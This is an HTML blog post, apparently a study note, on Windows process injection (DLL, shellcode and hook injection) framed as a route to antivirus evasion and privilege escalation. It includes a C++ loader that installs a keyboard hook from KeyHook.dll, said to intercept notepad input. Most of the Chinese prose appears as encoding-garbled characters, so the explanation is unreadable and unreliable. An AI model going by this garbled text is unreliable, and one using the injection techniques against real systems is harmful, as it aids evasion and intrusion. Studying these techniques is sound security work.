

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
  <link rel="icon" href="/img/head.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Epiphany">
  <meta name="keywords" content="">
  
    <meta name="description" content="‰ªéËøõÁ®ãÊ≥®ÂÖ•Âà∞ÊèêÊùÉ windows‰∏ãÁöÑ‰∏ÄÁ≥ªÂàóÊ≥®ÂÖ•ÊâãÊÆµÂú®ÂÖçÊùÄÂíåÊèêÊùÉ‰∏äÊúâËæÉÂ§ßÁöÑÁî®Â§ÑÔºåÂ≠¶‰π†ËøõÁ®ãÊ≥®ÂÖ•ÂØπWindowsÂÆâÂÖ®ÁöÑÁêÜËß£ÊúâÈáçË¶ÅÁöÑÂ∏ÆÂä©„ÄÇ ¬∂0x01 ‰ªÄ‰πàÊòØËøõÁ®ãÊ≥®ÂÖ• Á±ª‰ºº‰∫élinux‰∏ãÁöÑROPÔºåËøõÁ®ãÊ≥®ÂÖ•Âç≥‰∏∫Âú®‰∏Ä‰∏™Áã¨Á´ãÊ¥ªÂä®ÁöÑËøõÁ®ã‰∏≠Âú∞ÂùÄÁ©∫Èó¥ÊâßË°å‰ªªÊÑè‰ª£Á†ÅÁöÑÊñπÂºèÔºåÊ≠§Êó∂Ë¢´ÊâßË°åÁöÑ‰ªªÊÑè‰ª£Á†ÅÂèØ‰ª•ËÆøÈóÆÊ∫êËøõÁ®ãÁöÑÊâÄÊúâËµÑÊ∫êÁ©∫Èó¥ÔºåÂ∏∏Â∏∏Ë¢´Áî®Êù•ÊèêÊùÉÔºåÂêåÊó∂ÔºåËØ•ÊñπÂºèÈÄöËøáÊ≥®ÂÖ•Ê≠£Â∏∏ÁöÑËøõÁ®ãÔºåÂ∏∏Â∏∏ÂèØ‰ª•ÁªïËøáÊùÄËΩØÁöÑÊ£ÄÊµãÂíåÁôΩÂêçÂçïÊ£ÄÊµã„ÄÇ ‰ªéÂéüÁêÜ‰∏äËÆ≤ÔºåËøõ">
<meta property="og:type" content="article">
<meta property="og:title" content="‰ªéËøõÁ®ãÊ≥®ÂÖ•Âà∞ÊèêÊùÉ">
<meta property="og:url" content="http://example.com/2022/06/26/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/index.html">
<meta property="og:site_name" content="Epiphany&#39;s blog">
<meta property="og:description" content="‰ªéËøõÁ®ãÊ≥®ÂÖ•Âà∞ÊèêÊùÉ windows‰∏ãÁöÑ‰∏ÄÁ≥ªÂàóÊ≥®ÂÖ•ÊâãÊÆµÂú®ÂÖçÊùÄÂíåÊèêÊùÉ‰∏äÊúâËæÉÂ§ßÁöÑÁî®Â§ÑÔºåÂ≠¶‰π†ËøõÁ®ãÊ≥®ÂÖ•ÂØπWindowsÂÆâÂÖ®ÁöÑÁêÜËß£ÊúâÈáçË¶ÅÁöÑÂ∏ÆÂä©„ÄÇ ¬∂0x01 ‰ªÄ‰πàÊòØËøõÁ®ãÊ≥®ÂÖ• Á±ª‰ºº‰∫élinux‰∏ãÁöÑROPÔºåËøõÁ®ãÊ≥®ÂÖ•Âç≥‰∏∫Âú®‰∏Ä‰∏™Áã¨Á´ãÊ¥ªÂä®ÁöÑËøõÁ®ã‰∏≠Âú∞ÂùÄÁ©∫Èó¥ÊâßË°å‰ªªÊÑè‰ª£Á†ÅÁöÑÊñπÂºèÔºåÊ≠§Êó∂Ë¢´ÊâßË°åÁöÑ‰ªªÊÑè‰ª£Á†ÅÂèØ‰ª•ËÆøÈóÆÊ∫êËøõÁ®ãÁöÑÊâÄÊúâËµÑÊ∫êÁ©∫Èó¥ÔºåÂ∏∏Â∏∏Ë¢´Áî®Êù•ÊèêÊùÉÔºåÂêåÊó∂ÔºåËØ•ÊñπÂºèÈÄöËøáÊ≥®ÂÖ•Ê≠£Â∏∏ÁöÑËøõÁ®ãÔºåÂ∏∏Â∏∏ÂèØ‰ª•ÁªïËøáÊùÄËΩØÁöÑÊ£ÄÊµãÂíåÁôΩÂêçÂçïÊ£ÄÊµã„ÄÇ ‰ªéÂéüÁêÜ‰∏äËÆ≤ÔºåËøõ">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s1.ax1x.com/2022/06/28/jeNzFS.jpg">
<meta property="article:published_time" content="2022-06-26T12:07:39.000Z">
<meta property="article:modified_time" content="2022-06-29T03:21:36.469Z">
<meta property="article:author" content="Epiphany">
<meta property="article:tag" content="windowsÊèêÊùÉ">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://s1.ax1x.com/2022/06/28/jeNzFS.jpg">
  
  
  
  <title>‰ªéËøõÁ®ãÊ≥®ÂÖ•Âà∞ÊèêÊùÉ - Epiphany&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/prism/1.27.0/plugins/line-numbers/prism-line-numbers.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ‰∏ªÈ¢ò‰æùËµñÁöÑÂõæÊ†áÂ∫ìÔºå‰∏çË¶ÅËá™Ë°å‰øÆÊîπ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/test.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"üòä","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Yd9bxLI1IljOGgG9lkRff3xn-gzGzoHsz","app_key":"u1bgqKPgaMT2ekGfwvfs4SCT","server_url":"https://yd9bxli1.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Epiphany&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                È¶ñÈ°µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                ÂΩíÊ°£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-category-fill"></i>
                ÂàÜÁ±ª
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/categories/CTF">
                    
                    CTF
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/categories/CVE">
                    
                    CVE
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/categories/others">
                    
                    others
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/categories/chats">
                    
                    chats
                  </a>
                
              </div>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Ê†áÁ≠æ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                ÂÖ≥‰∫é
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://s1.ax1x.com/2022/06/28/jeNzFS.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="‰ªéËøõÁ®ãÊ≥®ÂÖ•Âà∞ÊèêÊùÉ"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-06-26 20:07" pubdate>
          ÊòüÊúüÊó•, ÂÖ≠Êúà 26Êó• 2022, 8:07 Êôö‰∏ä
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          12k Â≠ó
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          102 ÂàÜÈíü
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> Ê¨°
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">‰ªéËøõÁ®ãÊ≥®ÂÖ•Âà∞ÊèêÊùÉ</h1>
            
            
              <div class="markdown-body">
                
                <h1>‰ªéËøõÁ®ãÊ≥®ÂÖ•Âà∞ÊèêÊùÉ</h1>
<p>windows‰∏ãÁöÑ‰∏ÄÁ≥ªÂàóÊ≥®ÂÖ•ÊâãÊÆµÂú®ÂÖçÊùÄÂíåÊèêÊùÉ‰∏äÊúâËæÉÂ§ßÁöÑÁî®Â§ÑÔºåÂ≠¶‰π†ËøõÁ®ãÊ≥®ÂÖ•ÂØπWindowsÂÆâÂÖ®ÁöÑÁêÜËß£ÊúâÈáçË¶ÅÁöÑÂ∏ÆÂä©„ÄÇ</p>
<h2 id="0x01-‰ªÄ‰πàÊòØËøõÁ®ãÊ≥®ÂÖ•"><a class="header-anchor" href="#0x01-‰ªÄ‰πàÊòØËøõÁ®ãÊ≥®ÂÖ•">¬∂</a>0x01 ‰ªÄ‰πàÊòØËøõÁ®ãÊ≥®ÂÖ•</h2>
<p>Á±ª‰ºº‰∫élinux‰∏ãÁöÑROPÔºåËøõÁ®ãÊ≥®ÂÖ•Âç≥‰∏∫Âú®‰∏Ä‰∏™Áã¨Á´ãÊ¥ªÂä®ÁöÑËøõÁ®ã‰∏≠Âú∞ÂùÄÁ©∫Èó¥ÊâßË°å‰ªªÊÑè‰ª£Á†ÅÁöÑÊñπÂºèÔºåÊ≠§Êó∂Ë¢´ÊâßË°åÁöÑ‰ªªÊÑè‰ª£Á†ÅÂèØ‰ª•ËÆøÈóÆÊ∫êËøõÁ®ãÁöÑÊâÄÊúâËµÑÊ∫êÁ©∫Èó¥ÔºåÂ∏∏Â∏∏Ë¢´Áî®Êù•ÊèêÊùÉÔºåÂêåÊó∂ÔºåËØ•ÊñπÂºèÈÄöËøáÊ≥®ÂÖ•Ê≠£Â∏∏ÁöÑËøõÁ®ãÔºåÂ∏∏Â∏∏ÂèØ‰ª•ÁªïËøáÊùÄËΩØÁöÑÊ£ÄÊµãÂíåÁôΩÂêçÂçïÊ£ÄÊµã„ÄÇ</p>
<p>‰ªéÂéüÁêÜ‰∏äËÆ≤ÔºåËøõÁ®ãÊ≥®ÂÖ•ÊîπÂñÑ‰∫Ü‰∏çÂèØËßÅÊÄßÔºåÂêåÊó∂‰∏Ä‰∫õÊäÄÊúØ‰πüÂÆûÁé∞‰∫ÜÊåÅ‰πÖÊÄß„ÄÇ</p>
<p>ÁõÆÂâçÂ§ßËá¥‰∏äÊúâ‰∏§ÁßçÊ≥®ÂÖ•ÊñπÊ≥ï„ÄÇ</p>
<ul>
<li>dllÊ≥®ÂÖ•</li>
<li>shellcodeÊ≥®ÂÖ•</li>
</ul>
<p>‰∏™‰∫∫ËÆ§‰∏∫Âú®Êú¨Ë¥®‰∏äÔºå‰∫åËÄÖÈÉΩÊòØÊìç‰ΩúÁ≥ªÁªüÂèØ‰ª•ÊâßË°åÁöÑ‰ª£Á†ÅÔºå‰∏∫‰∫ÜÊñπ‰æøÂºÄÂèëÔºå‰ª£Á†ÅÈÄöÂ∏∏‰ºö‰ª•dllÁöÑÂΩ¢ÂºèÁºñËØëÂíå‰º†Êí≠ÔºåÂÆûÈôÖ‰∏äËøõË°åÊ≥®ÂÖ•ÁöÑÊó∂ÂÄôÔºå‰Ωú‰∏∫loadlibraryË¢´Âä†ËΩΩ„ÄÇ</p>
<p>Ê≥®ÂÖ•ÁöÑÊñπÂºèÂ§öÁßçÂ§öÊ†∑ÔºåËøôÈáåÊàë‰ª¨‰∏ªË¶ÅÁúãÂà∞‰∏§ÁßçÊ≥®ÂÖ•ÁöÑÊñπÂºèÔºå<strong>dllÂíåpeÊ≥®ÂÖ•</strong></p>
<h2 id="0x02-Âá†ÁßçËøõÁ®ãÊ≥®ÂÖ•ÁöÑÊñπÂºè"><a class="header-anchor" href="#0x02-Âá†ÁßçËøõÁ®ãÊ≥®ÂÖ•ÁöÑÊñπÂºè">¬∂</a>0x02 Âá†ÁßçËøõÁ®ãÊ≥®ÂÖ•ÁöÑÊñπÂºè</h2>
<h3 id="dllÁºñÂÜôËßÑÂàô"><a class="header-anchor" href="#dllÁºñÂÜôËßÑÂàô">¬∂</a>dllÁºñÂÜôËßÑÂàô</h3>
<p>È¶ñÂÖàÊàë‰ª¨ÈúÄË¶Å‰∫ÜËß£‰∏Ä‰∏ãdllÁöÑÁºñÂÜôËßÑÂàôÂíå‰∏Ä‰∫õÂÖ∑‰ΩìÁöÑÂÆûÁé∞„ÄÇ</p>
<p>DLLÔºàDynamic Linkable LibraryÔºâÂÆÉÊèê‰æõ‰∏Ä‰∫õÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®ÁöÑÂèòÈáèÔºåÁ±ªÂíåÂáΩÊï∞„ÄÇÂú®ÁªèÂéÜ‰∫Ü‚ÄúÊó†Â∫ì‚ÄîÈùôÊÄÅÈìæÊé•Â∫ì‚ÄîÂä®ÊÄÅÈìæÊé•Â∫ì‚ÄùÁöÑÂéÜÁ®ãÂêéÔºådll‰ΩøÁî®ÂçÅÂàÜÂπøÊ≥õ„ÄÇ</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/W_Y2010/article/details/80428067">https://blog.csdn.net/W_Y2010/article/details/80428067</a></p>
<p>ÁºñÂÜôËßÑÂàôÂíå‰πãÂâçÂÜôËøáÁöÑtinystlÂ∑Æ‰∏çÂ§öÔºåËØ≠Ê≥ï‰πüÊòØÂçïÁ∫ØÁöÑcËØ≠Ë®ÄËØ≠Ê≥ï„ÄÇÊúâ‰∏ÄÁÇπ‰∏ç‰∏ÄÊ†∑ÁöÑÊòØ</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/27/2bb043f58574f84d.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ÂáΩÊï∞ÁöÑËøîÂõûÂÄº‰ΩøÁî®dllÁöÑextern Â£∞ÊòéÔºåË°®ÊòéÂêéÈù¢ÁöÑÂáΩÊï∞ÊòØdllÁöÑÂØºÂá∫ÂáΩÊï∞„ÄÇÂü∫Êú¨Áî®Ê≥ïÂ∞±ÊòØËøôÊ†∑ËøòÊúâ‰∏Ä‰∫õÂà´ÁöÑÁî®Ê≥ï‰∏çËµòËø∞ÔºåÊú¨Ê¨°ÁöÑÈáçÁÇπÊòØÂºÑÊòéÁôΩdllÊ≥®ÂÖ•ÂíåhookÊ≥®ÂÖ•ÂíåpeÊ≥®ÂÖ•‰∏âÁßçÊñπÂºè„ÄÇ</p>
<h3 id="hookÊ≥®ÂÖ•ÂéüÁêÜ"><a class="header-anchor" href="#hookÊ≥®ÂÖ•ÂéüÁêÜ">¬∂</a>hookÊ≥®ÂÖ•ÂéüÁêÜ</h3>
<p>‰ªÄ‰πàÊòØhookÂë¢ÔºüËÅîÊÉ≥glibc‰∏≠ÁöÑhookÔºåË∞ÉÁî®mallocÂíåfree‰πãÂâç‰ºöÊü•ÁúãÂÖ∂‰∏≠ÁöÑhook„ÄÇÂÆûÈôÖ‰∏äÊäΩË±°Âá∫Êù•ÔºåWindows‰∏ãÁöÑhookÊú∫Âà∂‰πüÂíåÂÖ∂Á±ª‰ºº„ÄÇ</p>
<blockquote>
<p>hook‰Ωú‰∏∫‰∏ÄÁßçÊ∂àÊÅØÁõëÂê¨Êú∫Âà∂ÔºåÁ®ãÂ∫èÂèØ‰ª•ÈÄöËøáhookÂØπÊ∂àÊÅØÊàñÁ™óÂè£ËøõË°åÁõëÂê¨ÔºåÔºåÂç≥hookÂèØ‰ª•ÂíåÁâπÂÆöÁöÑÊó∂Èó¥ÊåÇÈí©ÔºåÂΩìÂ∫îÁî®Á®ãÂ∫èËß¶ÂèëËØ•ÁâπÊÆä‰∫ã‰ª∂‰πãÂêéÔºåÊìç‰ΩúÁ≥ªÁªüÂç≥‰ºöÂêëhookÂèëÂá∫ÈÄöÁü•Ê∂àÊÅØÔºåÊ≠§Êó∂hookÂáΩÊï∞Â∞±‰ºöÂìçÂ∫îÂØπÂ∫îÁöÑÊ∂àÊÅØ„ÄÇ</p>
</blockquote>
<p><img src="https://i.bmp.ovh/imgs/2022/06/27/2974a5f11e3b5ba7.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ËøôÈáåÂÄüÁî®Âà´‰∫∫ÁöÑÂõæÊù•Ëß£Èáä‰∏Ä‰∏ãÈí©Â≠êÁöÑÊú∫Âà∂Ôºå Âú®Micrisoft Windows‰∏≠Ôºå ÊØè‰∏™ËøõÁ®ãÈÉΩÊúâËá™Â∑±ÁöÑÁßÅÊúâÂú∞ÂùÄÁ©∫Èó¥„ÄÇÂΩìÊàë‰ª¨Áî®ÊåáÈíàÊù•ÂºïÁî®ÂÜÖÂ≠òÁöÑÊó∂ÂÄôÔºåÊåáÈíàÁöÑÂÄºË°®Á§∫ÁöÑÊòØËøõÁ®ãËá™Â∑±ÁöÑËá™Âà∂Á©∫Èó¥ÁöÑ‰∏Ä‰∏™ÂÜÖÂ≠òÂú∞ÂùÄ„ÄÇËøõÁ®ã‰∏çËÉΩÂàõÂª∫‰∏Ä‰∏™ÊåáÈíàÊù•ÂºïÁî®Â±û‰∫éÂÖ∂‰ªñËøõÁ®ãÁöÑÂÜÖÂ≠ò„ÄÇ</p>
<p>ËøôÊ†∑ËôΩÁÑ∂‰∏ÄÂÆöÁ®ãÂ∫¶‰∏ä‰øùËØÅ‰∫ÜÁ®ãÂ∫èÁöÑÂÆâÂÖ®ÊÄßÔºå‰ΩÜÊòØÂç¥‰πü‰ΩøÊàë‰ª¨ÂæàÈöæÁºñÂÜôËÉΩÂ§ü‰∏éÂÖ∂‰ªñËøõÁ®ãÈÄö‰ø°ÁöÑÂ∫îÁî®Á®ãÂ∫èÊàñÂØπÂÖ∂‰ªñËøõÁ®ãËøõË°åÊìçÊéßÁöÑÂ∫îÁî®Á®ãÂ∫è„ÄÇ</p>
<p>hookÂ∞±Ë¢´Áî®Êù•ÂÜçË¢´Ë∞ÉÁî®ÂáΩÊï∞ÂíåË∞ÉÁî®ËøõÁ®ã‰∏≠ÂÖÖÂΩì‰∏Ä‰∏™‰∏≠Èó¥‰∫∫ÔºåÁî®Êù•Êé•ÂèóÊ∂àÊÅØÔºåÂ§ÑÁêÜÊ∂àÊÅØÂíåËΩ¨ÂèëÊ∂àÊÅØ„ÄÇ</p>
<p>HookÁöÑÁ±ªÂûãÂú®Windows‰∏ã‰πüÊúâÂæàÂ§öÁßçÔºåÊ∂àÊÅØhookÔºåÊ≥®ÂÖ•hookÔºåinlineÂÜÖËÅîhookÁ≠âÔºåhookÊ≥®ÂÖ•‰∏≠Ôºå<strong>ÈáçÁÇπÂ≠¶‰π†ÁöÑÊòØÂÖ∂‰∏≠ÁöÑÊ≥®ÂÖ•hook</strong>Ôºå<strong>Ê≥®ÂÖ•hook</strong>ÔºåÂíåhjackingÂ∑Æ‰∏çÂ§öÔºåÂ∞±ÊòØÂä´ÊåÅAPIÁöÑË∞ÉÁî®ÂáΩÊï∞„ÄÇ</p>
<p>‰ΩÜÊòØÂâçÈù¢ËØ¥‰∫ÜÔºåÊØè‰∏™ËøõÁ®ãÊúâ‰∏Ä‰∏™ÁßÅÊúâÁöÑÂÜÖÂ≠òÁ©∫Èó¥ÔºåÈÇ£‰πàÊàëÂ¶ÇÊûúÊÉ≥Ë¶ÅAËøõÁ®ãhookBËøõÁ®ãÁöÑÂáΩÊï∞Ôºå‰ΩÜÊòØAÂèà‰∏çÂèØ‰ª•Áõ¥Êé•ËÆøÈóÆBÁöÑÂÜÖÂ≠òÁ©∫Èó¥ÔºåÈÇ£‰πàÂ∫îËØ•ÊÄé‰πàÂäûÔºü</p>
<p>Ëøô‰∏™Êó∂ÂÄôËÄÉËôëÂà∞dllÂä®ÊÄÅÈìæÊé•Â∫ìÁöÑÊ≥®ÂÖ•ÊäÄÊúØÔºåhookÂíådllÊ≥®ÂÖ•ÁªìÂêàÂç≥ÂèØËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢ò„ÄÇ<strong>ÊäähookÁöÑ‰ª£Á†ÅÂÜôÂÖ•dll‰∏≠ÔºåËÆ©BÁ®ãÂ∫èÂä†ËΩΩdllÔºåÂàôhookÂç≥ÂèØÁîüÊïà</strong>Ôºå‰πç‰∏ÄÁúãÊÑüËßâËøò‰∏çÂ¶ÇÁõ¥Êé•shellcodeÊù•ÁöÑÂÆûÂú®„ÄÇ‰∏ÄËà¨ÁöÑÊ≥®ÂÖ•ÊµÅÁ®ãÂ¶Ç‰∏ãÔºö</p>
<ol>
<li>ÂÆâË£Ö‰∏Ä‰∏™Èí©Â≠êÔºàÁ≥ªÁªüÁöÑdllÊ≥®ÂÖ•Ë¢´hookÔºâ</li>
<li>‰øùÂ≠òÁ≥ªÁªüÂáΩÊï∞ÂÖ•Âè£Â§ÑÁöÑ‰ª£Á†Å</li>
<li>ÊõøÊç¢ÊéâËøõÁ®ã‰∏≠ÁöÑÁ≥ªÁªüÂáΩÊï∞ÂÖ•Âè£ÊåáÂêëÊàë‰ª¨ÁöÑÂáΩÊï∞ÔºàÁõ¥Êé•‰øÆÊîπÂú∞ÂùÄÁ©∫Èó¥ÁöÑÂ≠óËäÇÔºâ</li>
<li>ÂΩìÁ≥ªÁªüÂáΩÊï∞Ë¢´Ë∞ÉÁî®Êó∂Á´ãÂç≥Ë∑≥ËΩ¨Âà∞Êàë‰ª¨ÁöÑÂáΩÊï∞</li>
<li>ÂáΩÊï∞Â§ÑÁêÜ</li>
<li>ÊÅ¢Â§çÁ≥ªÁªüÂáΩÊï∞ÂÖ•Âè£ÁöÑ‰ª£Á†ÅÔºàÂ§ÑÁêÜÂêéÊãñÈí©Ôºâ</li>
</ol>
<p>ËøôÊó∂ÂÄôÊàë‰ª¨ÂõûÂéªÁúãÂà∞ÁªôÁöÑÂÆûÈ™å‰ª£Á†ÅÔºö</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/420c2138c2b9725b.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>Êúâ‰∏§‰∏™cppÂáΩÊï∞ÔºåkeyhookÊòØÁºñËØëÊàêdllÁöÑcppÔºå‰∏äÈù¢ÊòØhookÁ®ãÂ∫èÁöÑexeÔºå‰πüÂç≥ÊòØAÁ®ãÂ∫è„ÄÇ</p>
<p>ÂÆûÁé∞ÁöÑÂÜÖÂÆπÊòØÔºåÁî®ÈîÆÁõòhookÊäÄÊúØÊã¶Êà™notepad.exeËøõÁ®ãÁöÑÈîÆÁõòÊ∂àÊÅØÔºå‰Ωø‰πãÊó†Ê≥ïÊòæÁ§∫Âú®ËÆ∞‰∫ãÊú¨‰∏≠</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;HookMain
#include &quot;stdio.h&quot;
#include &quot;conio.h&quot;
#include &quot;windows.h&quot;

#define	DEF_DLL_NAME		&quot;KeyHook.dll&quot;
#define	DEF_HOOKSTART		&quot;HookStart&quot;
#define	DEF_HOOKSTOP		&quot;HookStop&quot;

typedef void (*PFN_HOOKSTART)();
typedef void (*PFN_HOOKSTOP)();

void main()
&#123;
	HMODULE			hDll &#x3D; NULL; &#x2F;&#x2F;‰ª£Ë°®Â∫îÁî®Á®ãÂ∫èËΩΩÂÖ•ÁöÑÊ®°Âùó,Ë¢´ËΩΩÂÖ•Ê®°ÂùóÁöÑÁ∫øÊÄßÂú∞ÂùÄ
	PFN_HOOKSTART	HookStart &#x3D; NULL;
	PFN_HOOKSTOP	HookStop &#x3D; NULL;
	char			ch &#x3D; 0;
	
    &#x2F;&#x2F; Âä†ËΩΩÊåáÂÆöÁöÑdll
	hDll &#x3D; LoadLibraryA(DEF_DLL_NAME);
    if( hDll &#x3D;&#x3D; NULL )
    &#123;
        printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError());
        return;
    &#125;

	HookStart &#x3D; (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);
	HookStop &#x3D; (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);

	HookStart();
    
	printf(&quot;press &#39;q&#39; to quit!\n&quot;);
	while( _getch() !&#x3D; &#39;q&#39; )	;

	HookStop();
    
	FreeLibrary(hDll);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>Êúâ‰∏Ä‰∫õÈü©ÊñáÊ≥®ÈáäÔºåÂà†Êéâ‰∫Ü„ÄÇÁúãÁöÑÊúâÁÇπÁÇπ‰∏çÂ§™ÊáÇÔºåÂèØËÉΩÈúÄË¶ÅÁúãÂÆådllÈÉ®ÂàÜÊâçÊáÇ„ÄÇ</p>
